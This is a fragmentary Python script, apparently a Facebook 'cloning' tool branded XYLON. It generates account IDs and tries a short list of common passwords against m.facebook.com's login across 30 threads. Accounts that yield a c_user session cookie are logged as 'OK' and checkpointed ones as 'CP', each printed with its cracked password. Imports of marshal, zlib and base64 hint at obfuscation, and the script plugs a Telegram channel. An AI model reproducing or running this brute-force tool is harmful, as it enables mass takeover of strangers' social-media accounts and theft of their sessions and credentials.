...
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
...
if ltx > 12:
    ...
    a = ltx
    tag = "AM"
    print("PLEASE SUBSCRIBE OUR TELEGRAM CHANNEL")
    time.sleep(3)
logo ="""  \033[1;32;40m
▒██   ██▒▓██   ██▓ ██▓     ▒█████   ███▄    █ 
▒▒ █ █ ▒░ ▒██  ██▒▓██▒    ▒██▒  ██▒ ██ ▀█   █ 
...
\033[1;37m══════════════════════════════════════════════════
\033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑\033[1;31m  \033[1;32mXYLON
...
def pass5():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['khankhan','ali786','ali123','ali1122','aliali,xylon,abdullha']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'referer': 'https://m.facebook.com/?stype=lo&jlou=Affms5HzPKHwvXejGM-ezVfjaLGyk5D6nk48lnQPxEKlNc4GgxMS2iGyyEp2BukZzVPFy2U4V4sjU9BQViKT2tqn0-AHrI5dBCDBF9xuCQXScA&smuh=22128&lh=Ac9_B4OPU-k6MXo8Ozw&ref=dbl&_rdr',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m[XYLON-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91m[XYLON-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[XYLON=] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
